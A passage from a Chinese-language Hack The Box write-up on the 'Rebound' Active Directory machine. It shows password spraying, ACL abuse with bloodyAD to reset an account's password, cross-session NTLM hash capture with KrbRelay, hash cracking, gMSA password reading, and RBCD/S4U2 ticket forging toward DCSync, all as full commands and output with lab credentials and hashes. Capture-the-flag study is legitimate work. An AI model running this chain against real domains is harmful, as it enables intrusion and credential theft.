┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# crackmapexec smb 10.129.88.234 -u user.txt -p '1GR8t@$$4u' --continue-on-success
SMB         10.129.88.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.88.234   445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.88.234   445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.88.234   445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.88.234   445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.88.234   445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.88.234   445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.88.234   445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.88.234   445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
```

抓到一个oorend，但是它也过不了winrm。那我们再使用bloodhound看一下域内，发现还是报一样的错。经查询发现是机器与靶机相差时间过大，我们需要使用`ntpdate`来进行时间同步，再进行信息收集

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# bloodhound-python --domain rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -ns 10.129.88.234 -dc dc01.rebound.htb -c all --zip
```

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Rebound/02.png?raw=true)

可知oorend可将自己加进`servicemgmt`组内，而此组对含有`winrm_svc`的`service users`组拥有完全的写权限。我们先尝试将`oorend`加入组内。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# bloodyAD --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' add groupMember 'servicemgmt' 'oorend'
[+] oorend added to servicemgmt
```

接下来我们再使用`certipy-ad`套件来借助`shadow creditials`技术，获取winrm_svc的NTLM.首先我们得对winrm_svc拥有`fullcontrol`权限，但此处`editdacl`套件无法通过认证，我们只能使用`bloodyAD`手动来复现`shadow creditials`的全过程，或我们直接修改其密码

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
                                                                                             
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'Password!@#45'   
[+] Password changed successfully!
```

密码修改完成后，我们就可以通过winrm登录了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Rebound/03.png?raw=true)

获得`user.txt`后，我们再次采用bloodhound来查看结构，但是并没有新发现。`certipy-ad`查看CA服务也没有进展。转向查看主机正在运行的进程

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    408      33    12772      21648              2952   0 certsrv
    487      20     2568       5720               396   0 csrss
    260      16     2176       5260               520   1 csrss
    357      15     3460      15012               968   1 ctfmon
    397      33    16288      25124              2996   0 dfsrs
    186      12     2320       8056              3292   0 dfssvc
    285      14     3820      13756              4072   0 dllhost
   5384    4791    69260      71144              3024   0 dns
    601      26    24128      51980               320   1 dwm
   1504      58    23940      88832              5168   1 explorer
     53       6     1772       5440              2872   1 fontdrvhost
     53       6     1492       4708              2880   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    144      13     2232       5952              3040   0 ismserv
   2357     185    54240      72516               652   0 lsass
    471      35    49068      62688              2900   0 Microsoft.ActiveDirectory.WebServices
    254      13     2912      10768              4336   0 msdtc
    652      92   300084     319812              3208   0 MsMpEng
      0      13      396      14548                88   0 Registry
    229      12     2336      13036              1548   1 RuntimeBroker
    239      13     2744      17172              2984   1 RuntimeBroker
    316      17    19668      33184              5444   1 RuntimeBroker
    675      33    20312      74344              5640   1 SearchUI
    276      12     3088      12728              2012   0 SecurityHealthService
    621      14     5708      13356               636   0 services
    776      30    17196      60728              3936   1 ShellExperienceHost
    456      17     5080      25200              4572   1 sihost
     53       3      516       1228               304   0 smss
    209      12     1696       7532               336   0 svchost
    130      16     3552       8016               352   0 svchost
    215      12     1972      10124               368   0 svchost
    175       9     1632      11996               388   0 svchost
     89       5      896       4000               852   0 svchost
    936      20     6908      23140               876   0 svchost
    907      19     5280      12864               908   0 svchost
    212       9     1860       7336               952   0 svchost
    257      10     1984       7924               956   0 svchost
    257      13     3496       9188              1052   0 svchost
    256      14     3024      14044              1064   0 svchost
    394      13    13768      17940              1116   0 svchost
    279      16     3124      12528              1212   0 svchost
    236      12     2524      11848              1220   0 svchost
    440       9     2752       9252              1248   0 svchost
    148       7     1220       5924              1260   0 svchost
    373      18     4924      13192              1280   0 svchost
    203      11     2076       9768              1300   0 svchost
    407      32     7044      16640              1388   0 svchost
    176      11     1784       8424              1420   0 svchost
    372      17     4920      14660              1428   0 svchost
    177      11     2184      13756              1436   0 svchost
    316      13     2008       9148              1524   0 svchost
    333      10     2400       8736              1536   0 svchost
    287      13     3944      11532              1572   0 svchost
    191      12     1996      12212              1652   0 svchost
    138       8     1520       6424              1704   0 svchost
    158       8     1808       7416              1720   0 svchost
    145       9     1664       7120              1784   0 svchost
    219      10     2292       9444              1828   0 svchost
    168      12     1652       7548              1888   0 svchost
    268      13     2456       8100              1896   0 svchost
    223      12     2144       9464              1904   0 svchost
    416      16    11784      21376              1996   0 svchost
    472      19     3352      12468              2092   0 svchost
    249      25     3740      13272              2128   0 svchost
    223      12     2048       7736              2200   0 svchost
    210      11     2240       8792              2644   0 svchost
    229      12     2732      13024              2892   1 svchost
    145       7     1304       5992              2976   0 svchost
    313      16    15184      17412              2992   0 svchost
    449      20    17084      32516              3012   0 svchost
    285      20     3496      13188              3232   0 svchost
    138       9     1528       6732              3368   0 svchost
    130       7     1356       6148              3408   0 svchost
    169       9     2920       7716              3540   0 svchost
    160       9     3228      11508              4172   0 svchost
    320      17     5928      22656              4292   0 svchost
    188      15     6020      10328              4516   0 svchost
    405      26     3440      13372              4616   0 svchost
    283      20     7872      14384              5008   0 svchost
    158      10     1968       6972              5628   0 svchost
    388      19     6848      29380              5804   1 svchost
    173      11     2364      13324              5840   0 svchost
    119       7     1476       6184              5856   0 svchost
    205      11     2700      12068              5960   0 svchost
    172       9     1516       7564              6032   0 svchost
   1782       0      192        156                 4   0 System
    179      11     2396      11644              5944   1 taskhostw
    213      16     2384      11168              3716   0 vds
    172      11     2880      11604              2476   0 VGAuthService
    149       8     1788       7864              3220   0 vm3dservice
    150      10     1960       8428              3484   1 vm3dservice
    401      23    10232      23216              2600   0 vmtoolsd
    246      17     5112      15780              4728   1 vmtoolsd
    172      11     1412       7148               500   0 wininit
    283      12     2596      12992               592   1 winlogon
    389      20    10960      21568              3928   0 WmiPrvSE
    891      27    56528      73224       0.84    516   0 wsmprovhost
    640      26    54464      72140       0.53   1360   0 wsmprovhost
    613      33   104820     128864       1.56   4888   0 wsmprovhost
```

---

# 0x05 Remotepotato窃取session会话用户的NTLM hash

在尝试直接`qwinsta`列出所有会话时，回显莫名其妙的报错阻止。参考以下文章可以解决此问题：

- [windows - Cannot `qwinsta` during WinRM, but it works when run under `NewCredentials` logon type - Information Security Stack Exchange](https://security.stackexchange.com/questions/272327/cannot-qwinsta-during-winrm-but-it-works-when-run-under-newcredentials-logo)

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe oorend '1GR8t@$$4u' -l 9 'qwinsta'

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

我们发现同时还有一个`tbrady`的console会话。能否尝试通过此console来截获`tbrady`的NTLM HASH呢？答案是可以的。但我们需要采用`KrbRelay`项目来结合`RunasCS`来使用。首先利用`RunasCs`来进行cmd操作，再使用`KrbRelay`劫持`tbrady`用户的session会话，获取其NTLM。`KrbRelay`项目内集成了`RemotePotato0`项目，亦可自行下载`Remotepotato0`来进行NTLM获取。

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\RunasCs.exe x x -l 9 "C:\Users\winrm_svc\Documents\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"

[*] Auth Context: rebound\tbrady
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Users\winrm_svc\Documents\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADrlV8NDOAbgXA4D8NjMZs5AvwAAFwW//9lD/LooaT19iIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing cross-session authentication
[*] Using CLSID: 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4
[*] Spawning in session 1
[*] NTLM1
4e544c4d535350000100000097b218e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44
[*] NTLM2
4e544c4d53535000020000000e000e003800000015c299e29658d9b1aaf56517000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800e579aa6e14b5db0100000000000000000000000065007800650000000000000000000000000000000b000000
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons
[*] NTLM3
tbrady::rebound:9658d9b1aaf56517:67896d3bd0dc6683715a33ff0dade9cd:0101000000000000e579aa6e14b5db01381156298b56e05d0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800e579aa6e14b5db0106000400060000000800300030000000000000000100000000200000cc79d6a4a1d7ea352ca44d411ae0c2275f8b73b7e7b4972d95637c9fb7f306ef0a00100000000000000000000000000000000000090000000000000000000000
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)
   at KrbRelay.Program.Main(String[] args)
```

获得到`tbrady`的NTLM后，我们采用hashcat的NTLMv2来爆破

```cmd
TBRADY::rebound:9658d9b1aaf56517:67896d3bd0dc6683715a33ff0dade9cd:0101000000000000e579aa6e14b5db01381156298b56e05d0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800e579aa6e14b5db0106000400060000000800300030000000000000000100000000200000cc79d6a4a1d7ea352ca44d411ae0c2275f8b73b7e7b4972d95637c9fb7f306ef0a00100000000000000000000000000000000000090000000000000000000000:543BOMBOMBUNmanda

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TBRADY::rebound:9658d9b1aaf56517:67896d3bd0dc668371...000000
Time.Started.....: Thu Apr 24 13:43:52 2025 (2 secs)
Time.Estimated...: Thu Apr 24 13:43:54 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7782.8 kH/s (0.32ms) @ Accel:64 Loops:1 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12785633/14344386 (89.13%)
Rejected.........: 6113/12785633 (0.05%)
Restore.Point....: 11802445/14344386 (82.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 81591 -> 250294laise
Hardware.Mon.#1..: Temp: 51c Util:  8% Core:1950MHz Mem:14001MHz Bus:8

Started: Thu Apr 24 13:43:46 2025
Stopped: Thu Apr 24 13:43:55 2025
```

爆破出账密之后，我们再使用bloodhound来查看域内结构

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Rebound/04.png?raw=true)

`tbrady`用户对`delegator$`账户有`ReadGMSAPassword`的权限。查询可知我们可借助此账户阅读到`delegator$`机器账户的密码。不可以使用第三方工具，会提示`strongerAuthRequired`.我们还是得借助`bloodyAD`工具来实现攻击。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound/gMSADumper-main]
└─# bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword

distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:d0700a7a8e202cbad887ebf92e4d1080
msDS-ManagedPassword.B64ENCODED: MWi3XbICc9h6/Ln650H9COO5/84q/8lrbQbKFbkZytFOcMdxkROZMsb4bAdoOI2aOZ6cAQX+O69B147bt6B5pINcVQxDyAO4P8Ltj9uP5ex+vQBP1MI2EqeAMIJtWNj3p0W9o8HbwcmkKICZWkyuDC51xbcB+ESLTKtUUbzZ4JiCk+F3d0I/FUAoZXHNDPYXTfvIIBZlnPUNj4tvj9AgXpJd2AF6JyEPsefiEEU2R+dfjjxGPAer0HBADFuVk8Zg2TWhAaxBa3d/IhNuZJw3k935+KhjEIjxYb4qc+/NFvI56kOZFmt2DUjYJ0bz3x8AUlzMNi+4oGUCC5v5MMdwHg==
```

---

# 0x06 RBCD绕过ST无forward权限配置

拿到其NTLM后，我们查看一下关于`delegator$`的有关信息。其名就表明是与约束委派有关的账户，我们使用`impacket-findDelegation`套件来进行查询。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound/gMSADumper-main]
└─# impacket-findDelegation rebound.htb/delegator\$ -hashes aad3b435b51404eeaad3b435b51404ee:d0700a7a8e202cbad887ebf92e4d1080  -dc-ip 10.129.88.234 -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists 
-----------  -----------------------------------  --------------  ---------------------  ----------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
```

但是此约束委派的设置中是配置的`仅使用Kerberos`来进行认证，故无法使用常规`getST`来获取到DC01的NTLM。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound/gMSADumper-main]
└─# impacket-getST -spn http/dc01.rebound.htb -impersonate administrator 'rebound.htb/delegator$' -hashes :d0700a7a8e202cbad887ebf92e4d1080
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable
```

正常进行getST我们会发现提醒SPN不允许此用户进行委派。加入`-self`来打断`s4u2proxy`过程，仅做`s4u2self`过程，我们获取其票据并分析。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound/gMSADumper-main]
└─# impacket-getST -spn http/dc01.rebound.htb -impersonate administrator 'rebound.htb/delegator$' -hashes :d0700a7a8e202cbad887ebf92e4d1080 -self 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
[*] When doing S4U2self only, argument -spn is ignored
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
[*] Saving ticket in administrator@delegator$@REBOUND.HTB.ccache



┌──(root㉿kali)-[/home/kali/HTB/Rebound/gMSADumper-main]
└─# impacket-describeTicket administrator@delegator\$@REBOUND.HTB.ccache 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 555d23b076beef0280e43639f09d9858
[*] User Name                     : administrator
[*] User Realm                    : rebound.htb
[*] Service Name                  : delegator$
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 24/04/2025 10:30:36 AM
[*] End Time                      : 24/04/2025 20:30:35 PM
[*] RenewTill                     : 25/04/2025 10:30:19 AM
[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : VV0jsHa+7wKA5DY58J2YWA==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*delegator$*$22fabd71783223cb317fd3be$61120ba6f8c990237f489371c80851a3a08c0ec6b1a1c7221e2967072d553008c8dceb8a56eec7cdcff7aa2e0c3052657fe331f992cce65bc367b6fbd54af67af523e39230edf12388bfb9fcfc578a670fe9b7c0834502442e08356696015af09cedb72182ecafbe206dc6179e6d2d6e874fdd9ee5d07523907251cfade8517e7a1cd16973642beac0ec39d1485fe04b8ec1301f15eddcf7d87905ed497841e49452bf03d2c12a1a5b7387460f5b8532b2b4f1d3d24bf0889a561cb7284d0031eaf07e04287309d152c0d5c630bb531a7b7a96ceaf1a835f430977f72f269ac1900ac2b8067474fdb0f4acad515b4d9e46d01f27b5a011f4dd0349a2c1666f25c1a512ffe8ab8e56d11757f52354a71bb2caa58abd7e760f6d96db9c1ff20fbf8c6e12a26ea4a238ca234237a7775721e7d54ea814ca859bb75741d6c2f04f335b6061b9511f5f5994555d1a7d07cf5e581d0ee6a39b61d39d31d19a8a33bebf9c3fe301ef28619f952baf380f84f209d374133c12585847c03ae25e3edfdf50301dd36eba3629585b0b381b108dbe3c156d2ce4b6d64acb8bd6ce253b7ea75d4a56d0c05bfd91c86499f9063e8c5e0c1d287b5269ff6d529696a1563404823e063fc5ed63062e595923984052a88e9fadb8a45766283ab8bfe67f3f98673e5aed355cb6fac21c61fbe1ce38bdd8d9fe6509619819da9dfe94ff3401a7bc62af26c9ec09b879b8cd5cacfdc8791ee81193ea631f6f385e7562b60ae54781f1cfbd93e486422bfbbed02156e5c1fa752aa0da22af35c4ff5e488bc8153ccbdb2b22ac4eba06d2f5b49d36d61b202af0f2436555e77aff040ce8473b9223f34146eef6c30a68e6755c833b9fe8c9b1b324b859164e68363f42cad0f7c1be725f6b5645232e44e86864408d851f89789628ffae099ffac1e053cd08cc59337063e2f474ea579637dd67aab5f49ab5ad2cddf32de50352e9c8fda10e006ec080035b17a412673898edf9665fe19ab755a32244964c9dc0017c0c16e3fd800ff367f2c6b32efc63121e01f157d6750bfc7e65092169143f977c0b935d51a4a8eb1e030a85ae0db20583abf6bf1f65fbaf2b580ec71a6d52b531b884c58cf84f3f5711e025dee9872540d57b9ab082f085b67841a26324cd779a38926591049305baa06c2334226d4b8e572fba530b01402a0f3349555d4ce8fb2aa875b9ccf0af234a1f851e9f568a9a240f02d129bd39b511e276be92ade5757d369a7a549ddcca03513a75677f0289301d13e5130ef2f9ea011d596b47e62795737b0037d42917d999d7ff4ce98f28811dd4db310177f7bc4b838d4e3a97783783ed01d0abf05a7b1d6c20ae980f7b1dea6d26b20f74fb94bcd7994ab66a2fe89a8123e34a7d17ed1cb61dc3866ede1c21adf7915e01ee4e547dd003f42181b1cee01f2194e86a8f205d6a59eaf13f128aff51d541b329bffe1694e83d16ac38a64f84af2fe32c45246146bcf37b061af9d650e5c78d42bafc3c017f50b56867a83442faf70e125534af3d5b2d2b606a0bf093aa961c34bd9cfadaac102d37b4ce882a98c86ccbb7c63db7922171e724350dca1dd88d21a3a1a7e9c16d30f91f8e57e735428eb90e0a8392cb36b8d42a29
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : delegator$
[*]   Service Realm               : REBOUND.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

我们可以观察到flag字段有`renewable, pre_authent, enc_pa_rep`，但是并不包含`forward`字段，表明此票据是不可转发的，那我们也就没有办法通过`s4u2proxy`将其转发到DC上来骗取TGT了。

但是也有解决办法，参见`The Hacker Recipes`内容。我们可以将此`Delegator$`的`msDS-AllowedToActOnBehalfOfOtherIdentity`改为我们掌控的`ldap_monitor`，通过`ldap_monitor`申请到可转发的ST票据后，再以`delegator$`身份去申请DC01$的票据，最后DCsync即可获取到`administrator`的NTLM hash

首先我们需要写入基于资源的约束委派关系(RBCD)

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound/gMSADumper-main]
└─# rbcd.py rebound.htb/delegator\$ -hashes :d0700a7a8e202cbad887ebf92e4d1080 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/local/bin/rbcd.py:145: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
[*] ldap_monitor can already impersonate users on delegator$ via S4U2Proxy
[*] Not modifying the delegation rights.
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```

接下来我们使用getST借助`ldap_monitor`用户来获取可被转发的ST票据.先查看我们的rbcd是否成功写入了

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# findDelegation.py 'rebound.htb/delegator$' -dc-ip 10.129.88.234 -k -hashes :d0700a7a8e202cbad887ebf92e4d1080
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName   AccountType                          DelegationType              DelegationRightsTo     SPN Exists 
------------  -----------------------------------  --------------------------  ---------------------  ----------
ldap_monitor  Person                               Resource-Based Constrained  delegator$             No         
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb  No
```

再以ldap_monitor的身份去请求ST

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─# getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
/usr/local/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/usr/local/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/usr/local/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

检查一下此时我们收到的ST票据，在flag字段内我们可以发现`forwardable`

```bash
┌──(root㉿kali)-[/home/kali/HTB/Rebound]
└─#  impacket-describeTicket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 9743a71f3f13c0290c6dbc0e29e97ab6
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : browser/dc01.rebound.htb
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 24/04/2025 12:14:43 PM
[*] End Time                      : 24/04/2025 22:14:43 PM
[*] RenewTill                     : 25/04/2025 12:13:57 PM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : l0OnHz8TwCkMbbwOKel6tg==
[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$619da4c776864211abaead65$e8d85ba3c0327c6fb085afd6e77b8834c786fab7a48146483717d22194630cccbe5faedea05a53049dbf0cb15238d0c6663be437aefe2422179834b10720d17c9c45d8ea07571f8fb477bbf2c8430807a5a977b2336450460e0521821ee102d25743d5a6f59f1a9d636bf2741c594dcd681e54b8ca1a49b8acf71cdbdc34d78170c1c9be44dfc2144aca0f665b500e76eceb4c27d58fc72e7c01529c21ce8aa1d530f3459ac080afa365bcfe754560e2d172a5fd0cd9a426716eed1a5d3b40a6071301b488a3757114e55a22f0965d0262d3809ec474bbd2da1758aec8e2cfdb966c0699e517633741927dc63e2da0586dd6d04f276949e5c076159f1c36b9a73c48770444dda677097de3075f7cc147bcad7060d78e59d8228f721ab43e9411f2ec0ab6ee6f5724c4375f47e23d4ec9874a6fd61ae17a06b75dd7093720771b5ce65a3bfba9a90592a5e1abaf953df727d01b855449e7ce3d3db227d4dd5b1b1a8a2c1c0d8f35896f96f34aef02b3e2d4b04eb6f4a6507a2bc8961edba4925df092c4b0d5f7564deb0c28bac3c975ae2238dde71fca6efa0b2904bb8e10d8a38452df9b5100a3e93a6913c8efe9fa5d16003d07cb7082edc37d0751f68ec9425b325c9917c8844c3a5d1d25539591567197cec20c47ff70a2a6b0f58d5a1e83786f5deb41381c9885c9b3089f8cf8ee362a7d8a20fb8b6c270781e8e356ecdfde044ee29be231f81c35d1e396a46d59f507275d732890cbe62f4667659843dbf82b788e9ee828ac6f7d1f764045fe8379e85bd629cdc0b6702fde77bb24e4a81ac5c6eed5e7b97957db0cbb9e27e2b34a65f77bc312a334acd2dcac9ee168bd480f50b8dc0f1ff1bee381735a16b963fb568a543d191dfab02d8d21cf0ceaf247f5113b1d2c62aa93d6d754c5b880436ac19cb6652f8a4e9437594f6d8ac0afd1b6c4ae42fe56089424d4957b50045b39afbd724a1935e58f48b52c0c68f439a6a9bd8226459192525a5866f5391c34a0caf7e33b13c6c7555c02d55445f05ffc567a8d6c7cc384381dbb76c5a7663c00ee5e84509f96a21a7a012dcdb17b2f6b6fb432b95674fbae8c1707b8592aa0e192cdcf072cfc4be215e4415686a9afdeb4b07e6ec4f97ec273df9952791662356145534df414bd754ba6c4f4aa655fd8d66eae6998a860537bcdafe86bf3b52aad3b5c88696490248ccc8680ff2c8f17b215e66bf977e0c42e68f90691a9decf34205d75e4685c4c1bd42f65d7262a25817a59a6fe0f531aef4a7aad3ae41b5567de6ab580639cb3ca6c6ce030f68c4f6e83a254e4adde17285fd4feb023d1d5502938bd05baf05b4ccd838e39f0c1e494d7e6c879790f15c14f0900f56f53cbfd311c943461f89dae39cb4534c0cf1b8896a031c76f1a01aea8a526644234473